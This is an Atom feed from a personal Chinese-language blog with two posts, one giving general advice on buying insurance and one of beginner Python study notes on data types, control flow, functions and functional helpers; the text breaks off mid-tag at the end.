<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>zhou shaw</title>
  
  <subtitle>zhou shaw&#39;s blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://zhoushaw.github.io/"/>
  <updated>2019-09-17T14:00:46.290Z</updated>
  <id>http://zhoushaw.github.io/</id>
  
  <author>
    <name>zhou shaw</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>如何选购保险</title>
    <link href="http://zhoushaw.github.io/2019/09/17/other/life/%E4%BF%9D%E9%99%A9/"/>
    <id>http://zhoushaw.github.io/2019/09/17/other/life/保险/</id>
    <published>2019-09-17T03:39:35.000Z</published>
    <updated>2019-09-17T14:00:46.290Z</updated>
    
    <content type="html"><![CDATA[<div><a id="more"></a></div><p>##保险</p><ul><li>保险越早买越好，每次过生日保费会越来越贵</li></ul><h2 id="重疾险选购"><a href="#重疾险选购" class="headerlink" title="重疾险选购"></a>重疾险选购</h2><ul><li>是否包含轻症赔付很重要</li><li>小心多次赔付</li><li>保额充足很重要，至少30-50万起</li></ul><h2 id="意外险"><a href="#意外险" class="headerlink" title="意外险"></a>意外险</h2><ul><li>最低保额50万，最少5年收入的额度</li></ul><h2 id="寿险"><a href="#寿险" class="headerlink" title="寿险"></a>寿险</h2><ul><li>谁来买：给家庭经济支柱买</li><li>寿险保障到60岁退休以后就可以了</li><li>孩子不承担家庭经济任务，不需要买</li></ul><h2 id="如何顺利理赔"><a href="#如何顺利理赔" class="headerlink" title="如何顺利理赔"></a>如何顺利理赔</h2><p>关键点：做好健康告知</p><p>原则：问啥答啥，不问不答，如实告知</p><h2 id="配置顺序"><a href="#配置顺序" class="headerlink" title="配置顺序"></a>配置顺序</h2><p>1.夫妻最优先配置<br>2.孩子<br>3.老人</p><p><strong>重疾险</strong>和<strong>寿险</strong>首选</p><p><strong>保额</strong>和<strong>保障期限</strong>是两个重要的因素之一</p><h2 id="重疾险"><a href="#重疾险" class="headerlink" title="重疾险"></a>重疾险</h2><blockquote><p>多少保额够用呢</p></blockquote><p>根据现在医疗机构公布的数据，重大疾病至少需要三十万,而且重大疾病的康复周期是3-5年，最低保额=30万+3年年收入</p><blockquote><p>根据预算确定期限</p></blockquote><p>成人重疾险一般可以保障70-80岁或者终生，预算充足可以直接选择终生。</p><p>以35岁的成年保额50万举例的话终身重疾险险的保费大概是7000多元，如何预算是在有限可以保到70岁或者80岁。一个35岁的成年人保额50万保障到70岁，费用大概是4000多元</p><p>如果特别想要终身保障，预算略显不足的话，可以通过终身和定期重疾险的组合配置来实现，我们可以把保额做一定的分割，一部分保额买定期中级，另一部分买终身重疾</p><blockquote><p>怎么选</p></blockquote><p>需要考虑：</p><ul><li>保障期限</li><li>疾病种类</li><li>赔付次数</li><li>健康告知</li></ul><h2 id="孩子选什么保险"><a href="#孩子选什么保险" class="headerlink" title="孩子选什么保险"></a>孩子选什么保险</h2><ul><li>孩子是不需要寿险的</li><li>如果要选选择重疾险、医疗险、意外险</li><li>切记给孩子买了保险，父母没买足保险</li><li>先给孩子上医保</li><li>如果要选就选儿童专属重疾，保证到成年即可<ul><li>白血病</li><li>重症手足口等</li></ul></li><li>最长保到三十岁即可，保费可以便宜很多，而且保险日新月异，后面可以选择其他的保险</li></ul><h2 id="老人选什么"><a href="#老人选什么" class="headerlink" title="老人选什么"></a>老人选什么</h2><p>老人年龄大保费贵、老人一般都会有健康问题</p><ul><li>老人优选防癌险，防癌险相对重疾更加便宜，癌症最高发</li><li>防癌险不会对种类进行要求，都会赔付</li><li>父母年龄越大，疾病发生，他们非常需要保险</li><li>在买保险前先咨询专业的人士，这样在赔付时才不会出现理赔纠纷</li></ul><h2 id="如何配置家庭保险"><a href="#如何配置家庭保险" class="headerlink" title="如何配置家庭保险"></a>如何配置家庭保险</h2><blockquote><p>高房贷，家庭收入集中在个人身上</p></blockquote><p>家庭主要经济来源需要配置高额度寿险，可以保障到60岁退休</p><blockquote><p>买保险，充分分析自己的情况和需求进行选择</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>理财和保障分开做，不要买理财保险</li><li>优先给家庭经济支柱配置保险</li><li>考虑到性价比，不要给孩子买捆绑了寿险的重疾险</li><li>预算在有限，都不能妥协保障额度</li><li>不能人云亦云，要给予自己家庭情况进行配置规划</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;div&gt;
    
    </summary>
    
      <category term="life" scheme="http://zhoushaw.github.io/categories/life/"/>
    
    
      <category term="life" scheme="http://zhoushaw.github.io/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>python知识</title>
    <link href="http://zhoushaw.github.io/2019/09/11/learning/python/python-basics/"/>
    <id>http://zhoushaw.github.io/2019/09/11/learning/python/python-basics/</id>
    <published>2019-09-11T05:14:00.000Z</published>
    <updated>2019-09-17T12:44:12.334Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = input(&apos;please enter your name: &apos;)</span><br><span class="line">print(&apos;hello,&apos;, name)</span><br></pre></td></tr></table></figure><p>命令行展示:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Workspace&gt; python hello.py</span><br><span class="line">please enter your name: Michael</span><br><span class="line">hello, Michael</span><br></pre></td></tr></table></figure><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><ul><li>整型</li><li>浮点型</li><li>字符串</li><li>布尔值</li><li>空值</li></ul><p><code>int()</code>函数可以将字符类型的数字转成int型</p><blockquote><p>字符串</p></blockquote><p><code>某些特殊字符进行“转义”，Python 字符串用 \ 进行转义</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\n 表示换行</span><br><span class="line">\t 表示一个制表符</span><br><span class="line">\\ 表示 \ 字符本身</span><br></pre></td></tr></table></figure><ul><li>对特殊字符串进行转义，使用\，对多个特殊字符进行转换是使用r’特殊字符’</li><li>多行’’’…..’’’,类似js<code></code>模板字符串</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(&apos;&apos;&apos;line1</span><br><span class="line">... line2</span><br><span class="line">... line3&apos;&apos;&apos;)</span><br><span class="line">line1</span><br><span class="line">line2</span><br><span class="line">line3</span><br></pre></td></tr></table></figure><p><strong>读取中文</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br></pre></td></tr></table></figure><p>由于 Python 源代码也是一个文本文件，所以，当你的源代码中包含中文的时候，在保存源代码时，就需要务必指定保存为 UTF-8 编码。当Python 解释器读取源代码时，为了让它按 UTF-8 编码读取</p><blockquote><p>布尔型</p></blockquote><ul><li>布尔值可以用 and、or 和 not 运算。</li><li>and 运算是与运算，只有所有都为 True，and 运算结果才是 True。</li><li>or 运算是或运算，只要其中有一个为 True，or 运算结果就是 True。</li><li>not 运算是非运算，它是一个单目运算符，把 True 变成 False，False 变成 True。</li></ul><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>ASCII：不包含中文<br>Unicode：国际标准编码<br>UTF-8：对Unicode进行了优化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br></pre></td></tr></table></figure><ul><li>第一行注释是为了告诉Linux/OS X系统，这是一个Python可执行程序，Windows系统会忽略这个注释；</li><li>第二行注释是为了告诉Python解释器，按照UTF-8编码读取源代码，否则，你在源代码中写的中文输出可能会有乱码。</li></ul><h2 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;Hello, %s&apos; % &apos;world&apos;</span><br><span class="line">&apos;Hello, world&apos;</span><br><span class="line">&gt;&gt;&gt; &apos;Hi, %s, you have $%d.&apos; % (&apos;Michael&apos;, 1000000)</span><br><span class="line">&apos;Hi, Michael, you have $1000000.&apos;</span><br></pre></td></tr></table></figure><table><thead><tr><th>占位符</th><th>替换内容</th></tr></thead><tbody><tr><td>%d</td><td>整数</td></tr><tr><td>%f</td><td>浮点数</td></tr><tr><td>%s</td><td>字符串</td></tr><tr><td>%x</td><td>十六进制整数</td></tr></tbody></table><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p>Python内置的一种数据类型是列表：list。list是一种有序的集合，可以随时添加和删除其中的元素。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; classmates = [&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;]</span><br><span class="line">&gt;&gt;&gt; classmates</span><br><span class="line">[&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;]</span><br></pre></td></tr></table></figure><ul><li>获取数组长度:<code>len(classmates)</code></li><li>通过索引下标获取值: <code>classmates[0]</code><ul><li>输出：<code>&#39;Michael&#39;</code></li></ul></li><li>指定位置插入：<code>classmates.insert(1, &#39;Jack&#39;)</code></li><li>在最后插入：<code>classmates.append(&#39;Adam&#39;)</code></li><li>在最后删除：<code>classmates.pop()</code></li><li>删除指定位置 <code>classmates.pop(1)</code></li><li>取list区间值：<code>L[star:end]</code>，取0到3之间的元素不包含end<ul><li>索引为0时可以省略<code>L[:3]</code>取前三个</li><li>可以用-数序号，倒数第一个元素的索引是-1，取后十个: <code>L[-10:]</code></li><li>前10个数，每两个取一个: <code>L[:10:2]</code></li><li>字符串也可以与list类似的取值方式</li></ul></li><li>数组反转<ul><li>reverse，<code>list.reverse()</code></li><li>切片反转<code>list[::-1]</code></li></ul></li></ul><h4 id="列表生成器"><a href="#列表生成器" class="headerlink" title="列表生成器"></a>列表生成器</h4><blockquote><p>生成list</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; list(range(1, 11))</span><br><span class="line">[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]</span><br></pre></td></tr></table></figure><blockquote><p>迭代元素基础上增加</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [x * x for x in range(1, 11)]</span><br><span class="line">[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]</span><br></pre></td></tr></table></figure><blockquote><p>迭代元素筛选，仅留下偶数</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [x * x for x in range(1, 11) if x % 2 == 0]</span><br><span class="line">[4, 16, 36, 64, 100]</span><br></pre></td></tr></table></figure><blockquote><p>两层循环</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [m + n for m in &apos;ABC&apos; for n in &apos;XYZ&apos;]</span><br><span class="line">[&apos;AX&apos;, &apos;AY&apos;, &apos;AZ&apos;, &apos;BX&apos;, &apos;BY&apos;, &apos;BZ&apos;, &apos;CX&apos;, &apos;CY&apos;, &apos;CZ&apos;]</span><br></pre></td></tr></table></figure><h4 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h4><ul><li>将迭代器的<code>[]</code>更改成<code>()</code>生成的将会是迭代器，迭代器保存的数据的规则</li><li>生成器对象可以通过<code>next()</code>函数调用</li><li>生成器也可以通过<code>for in</code>迭代</li></ul><h3 id="tuple-元组"><a href="#tuple-元组" class="headerlink" title="tuple(元组)"></a>tuple(元组)</h3><p>tuple与list类似，都是但是tuple初始化完成后，不可添加删除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; classmates = (&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;)</span><br></pre></td></tr></table></figure><p>也可以通过下标<code>0</code>、<code>1</code>访问tuple内的元素</p><p>定义一个元组时,需要增加<code>,</code>号，因为()一般也用于计算，为了区分所以要增加<code>,</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a = (&apos;few&apos;,)</span><br></pre></td></tr></table></figure><h2 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">age = 3</span><br><span class="line">if age &gt;= 18:</span><br><span class="line">    print(&apos;adult&apos;)</span><br><span class="line">elif age &gt;= 6:</span><br><span class="line">    print(&apos;teenager&apos;)</span><br><span class="line">else:</span><br><span class="line">    print(&apos;kid&apos;)</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if &lt;条件判断1&gt;:</span><br><span class="line">    &lt;执行1&gt;</span><br><span class="line">elif &lt;条件判断2&gt;:</span><br><span class="line">    &lt;执行2&gt;</span><br><span class="line">elif &lt;条件判断3&gt;:</span><br><span class="line">    &lt;执行3&gt;</span><br><span class="line">else:</span><br><span class="line">    &lt;执行4&gt;</span><br></pre></td></tr></table></figure><p>if判断条件还可以简写，比如写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if x:</span><br><span class="line">    print(&apos;True&apos;)</span><br></pre></td></tr></table></figure><p>只要x是非零数值、非空字符串、非空list等，就判断为True，否则为False</p><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><blockquote><p>循环数组</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">names = [&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;]</span><br><span class="line">for name in names:</span><br><span class="line">    print(name)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Michael</span><br><span class="line">Bob</span><br><span class="line">Tracy</span><br></pre></td></tr></table></figure><p>for in 就是按顺序迭代</p><p><code>range()</code>函数可以生成一个整数序列，再通过list()函数可以转换为list</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; list(range(5))</span><br><span class="line">[0, 1, 2, 3, 4]</span><br></pre></td></tr></table></figure><blockquote><p>while循环</p></blockquote><p>输出1+2+…+10结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sum = 0</span><br><span class="line">n = 10</span><br><span class="line">while n &gt; 0:</span><br><span class="line">    sum = sum + n</span><br><span class="line">    n = n - 1</span><br><span class="line">print(sum)</span><br></pre></td></tr></table></figure><p>提前终止</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sum = 0</span><br><span class="line">n = 10</span><br><span class="line">while n &gt; 0:</span><br><span class="line">    if n&lt;5:</span><br><span class="line">        break</span><br><span class="line">    sum = sum + n</span><br><span class="line">    n = n - 1</span><br><span class="line">print(sum)</span><br></pre></td></tr></table></figure><p>continue，跳过当前循环，执行下一循环，例：不加偶数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sum = 0</span><br><span class="line">n = 10</span><br><span class="line">while n &gt; 0:</span><br><span class="line">    n = n - 1</span><br><span class="line">    if n%2==0:</span><br><span class="line">        continue</span><br><span class="line">    sum = sum + n</span><br><span class="line">print(sum)</span><br></pre></td></tr></table></figure><h2 id="字典dict"><a href="#字典dict" class="headerlink" title="字典dict"></a>字典dict</h2><p>dict全称dictionary，在其他语言中也称为map，使用键-值（key-value）存储</p><p>dict的key必须是不可以变的所以，key不可以是list或另一个dict，字符、整数这些就是不可变的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d = &#123;&apos;Michael&apos;: 95, &apos;Bob&apos;: 75, &apos;Tracy&apos;: 85&#125;</span><br><span class="line">&gt;&gt;&gt; d[&apos;Michael&apos;]</span><br><span class="line">95</span><br></pre></td></tr></table></figure><ul><li>添加新key-value<code>d[&#39;Adam&#39;] = 67</code></li><li>获取不存在的key会报错<code>d[&#39;shaw&#39;]</code></li><li>通过in判断key是否存在<code>&#39;Thomas&#39; in d</code></li><li><code>get()</code>方法判断是否存在<ul><li>如果key不存在，返回None</li><li><code>d.get(&#39;shaw&#39;,-1)</code>，不存在指定返回-1</li></ul></li><li>删除指定key<code>d.pop(&#39;Bob&#39;)</code></li></ul><h2 id="set"><a href="#set" class="headerlink" title="set"></a>set</h2><p>set和dict类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在set中，没有重复的key</p><p>要创建一个set，需要提供一个list作为输入集合：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = set([1, 2, 3])</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">&#123;1, 2, 3&#125;</span><br></pre></td></tr></table></figure><ul><li>重复的将自动过滤掉</li><li>通过<code>add(key)</code>方法可以添加元素到set中<code>s.add(4)</code></li><li>通过<code>remove(key)</code>方法可以删除元素,s.remove(4)</li></ul><blockquote><p>set可以看成数学意义上的无序和无重复元素的集合，因此，两个set可以做数学意义上的交集、并集等操作：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s1 = set([1, 2, 3])</span><br><span class="line">&gt;&gt;&gt; s2 = set([2, 3, 4])</span><br><span class="line">&gt;&gt;&gt; s1 &amp; s2</span><br><span class="line">&#123;2, 3&#125;</span><br><span class="line">&gt;&gt;&gt; s1 | s2</span><br><span class="line">&#123;1, 2, 3, 4&#125;</span><br></pre></td></tr></table></figure><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p>通过<code>help(abs)</code>查看<code>abs</code>函数的帮助信息</p><ul><li><code>abs</code>: 求绝对值的函数</li><li><code>max</code>: 比较数据</li><li><code>int</code>: 可以把其他数据类型转换为整数</li><li><code>float</code>: 转成浮点数</li><li><code>str</code>: 转成字符型</li><li><code>bool</code>: 转成boolean类型</li><li><code>hex</code>: 转成十六进制</li></ul><p>通过<code>lambda</code>来定义匿名函数<br>匿名函数<code>lambda x: x * x</code>实际上就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def f(x):</span><br><span class="line">    return x * x</span><br></pre></td></tr></table></figure><h2 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h2><ul><li>通过<code>def</code>关键词来声明函数</li><li>括号内的<code>x</code>是相应的参数</li><li>没有定义return值，默认返回<code>None</code></li><li>返回的多个值，将会变成tuple</li><li><code>python</code>中函数与变量之间也存在闭包，返回函数通过对外层函数变量的引用也会导致变量闭包，与JavaScript中的闭包非常类似，不过里层变量在使用外层作用域变量时需要使用<code>nonlocal</code>对变量进行申明</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def my_abs(x):</span><br><span class="line">    if x &gt;= 0:</span><br><span class="line">        return x</span><br><span class="line">    else:</span><br><span class="line">        return -x</span><br></pre></td></tr></table></figure><blockquote><p>定义空函数</p></blockquote><p>使用<code>pass</code>语句，若函数、条件判断不使用pass关键词又为空的会将会报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def nop():</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><h2 id="函数的参数"><a href="#函数的参数" class="headerlink" title="函数的参数"></a>函数的参数</h2><ul><li>默认情况下不校验参数类型，内置函数会校验参数类型</li><li>会校验参数个数</li><li>可以给参数定义默认值<ul><li>必选参数在前，默认参数在后</li><li>提供了默认参数，在调用函数时默认参数不传</li><li>默认参数必须指向不变对象！(可变对象对此调用函数后将会导致值更改值被缓存下来了)</li></ul></li></ul><blockquote><p>可变参数，参数传入的数量可以是不定的，通过<code>*</code>关键词可以将传入的参数变成元组,可以不传参</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def calc(*numbers):</span><br><span class="line">    print(numbers)</span><br><span class="line">calc(1,2,3,4)</span><br><span class="line"># 运行输出</span><br><span class="line">&gt;&gt;&gt; calc(1,2,3,4)</span><br><span class="line">(1,2,3,4)</span><br><span class="line"></span><br><span class="line"># calc(*numbers) === calc((1,2,3,4))</span><br></pre></td></tr></table></figure><blockquote><p>可以将list或tuple的元素变成可变参数传进去，相当于数组解构展开</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; nums = [1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; calc(*nums)</span><br><span class="line">(1,2,3)</span><br><span class="line"></span><br><span class="line"># calc(*nums) === calc(1,2,3)</span><br></pre></td></tr></table></figure><blockquote><p>关键字参数允许你传入0个或任意个含参数名的参数，这些关键字参数在函数内部自动组装为一个dict</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def person(name, age, **kw):</span><br><span class="line">    print(&apos;name:&apos;, name, &apos;age:&apos;, age, &apos;other:&apos;, kw)</span><br><span class="line">&gt;&gt;&gt; person(&apos;Bob&apos;, 35, city=&apos;Beijing&apos;,job=&apos;Engineer&apos;)</span><br><span class="line">(&apos;name:&apos;, &apos;Bob&apos;, &apos;age:&apos;, 35, &apos;other:&apos;, &#123;&apos;city&apos;: &apos;Beijing&apos;, &apos;job&apos;: &apos;Engineer&apos;&#125;)</span><br></pre></td></tr></table></figure><p>简化的写法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; extra = &#123;&apos;city&apos;: &apos;Beijing&apos;, &apos;job&apos;: &apos;Engineer&apos;&#125;</span><br><span class="line">&gt;&gt;&gt; person(&apos;Jack&apos;, 24, **extra)</span><br><span class="line">name: Jack age: 24 other: &#123;&apos;city&apos;: &apos;Beijing&apos;, &apos;job&apos;: &apos;Engineer&apos;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>命名关键字参数必须传入参数名</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def person(name, age, *, city=&apos;Beijing&apos;, job):</span><br><span class="line">    print(name, age, city, job)</span><br><span class="line">&gt;&gt;&gt; person(&apos;Jack&apos;, 24, job=&apos;Engineer&apos;)</span><br><span class="line">Jack 24 Beijing Engineer</span><br></pre></td></tr></table></figure><h3 id="函数式编程"><a href="#函数式编程" class="headerlink" title="函数式编程"></a>函数式编程</h3><blockquote><p>map</p></blockquote><ul><li><code>map</code>接收两个参数，第一个是<code>Iterable</code>的函数，第二个是需要迭代的list、或set数据<ul><li><code>Iterable</code>迭代的参数将会接收到两个参数：第一个参数是前一个，第二个参数是后一个</li><li>map返回的是一个新的list</li></ul></li><li>list所有元素*10</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def f(x):</span><br><span class="line">    return x * x</span><br><span class="line">r = map(f, [1, 2, 3, 4, 5, 6, 7, 8, 9])</span><br><span class="line">list(r)</span><br></pre></td></tr></table></figure><blockquote><p>reduce</p></blockquote><p>reduce把结果继续和序列的下一个元素做累积计算，其效果就是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reduce(f, [x1, x2, x3, x4]) = f(f(f(x1, x2), x3), x4)</span><br></pre></td></tr></table></figure><p>例如序列求和:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from functools import reduce</span><br><span class="line">def add(x, y):</span><br><span class="line">    return x + y</span><br><span class="line"></span><br><span class="line">reduce(add, [1, 3, 5, 7, 9])</span><br></pre></td></tr></table></figure><blockquote><p>filter</p></blockquote><p><code>filter()</code>函数用于过滤序列,和<code>map()</code>类似，<code>filter()</code>也接收一个函数和一个序列。和<code>map()</code>不同的是，<code>filter()</code>把传入的函数依次作用于每个元素，然后根据返回值是<code>True</code>还是<code>False</code>决定保留还是丢弃该元素。</p><p>例如删掉偶数，只保留奇数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def is_odd(n):</span><br><span class="line">    return n % 2 == 1</span><br><span class="line"></span><br><span class="line">list(filter(is_odd, [1, 2, 4, 5, 6, 9, 10, 15]))</span><br><span class="line"># 结果: [1, 5, 9, 15]</span><br></pre></td></tr></table></figure><blockquote><p>sorted</p></blockquote><p>排序也是在程序中经常用到的算法。无论使用冒泡排序还是快速排序，排序的核心是比较两个元素的大小。如果是数字，我们可以直接比较，但如果是字符串或者两个dict呢？直接比较数学上的大小是没有意义的，因此，比较的过程必须通过函数抽象出来。</p><ul><li><code>sorted()</code>函数也是一个高阶函数，<ul><li>还可以接收一个key函数来实现自定义的排序，例如: <ul><li>按绝对值大小排序<br><code>sorted([36, 5, -12, 9, -21], key=abs)</code></li></ul></li></ul></li><li>默认情况下，对字符串排序，是按照ASCII的大小比较的</li><li>忽略大小写<ul><li><code>sorted([&#39;bob&#39;, &#39;about&#39;, &#39;Zoo&#39;, &#39;Credit&#39;], key=str.lower)</code></li></ul></li><li>反向排序，传入<code>reverse=True</code></li></ul><h2 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h2><p>在Python中，迭代是通过<code>for ... in</code>来完成的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;&apos;a&apos;: 1, &apos;b&apos;: 2, &apos;c&apos;: 3&#125;</span><br></pre></td></tr></table></figure><blockquote><p>迭代dict</p></blockquote><p><code>dict</code>迭代的是<code>key</code>。如果要迭代<code>value</code>，可以用<code>for value in d.values()</code>，如果要同时迭代<code>key</code>和<code>value</code>，可以用<code>for k, v in d.items()</code>。</p><blockquote><p>判断对象是否是可迭代项目</p></blockquote><figure 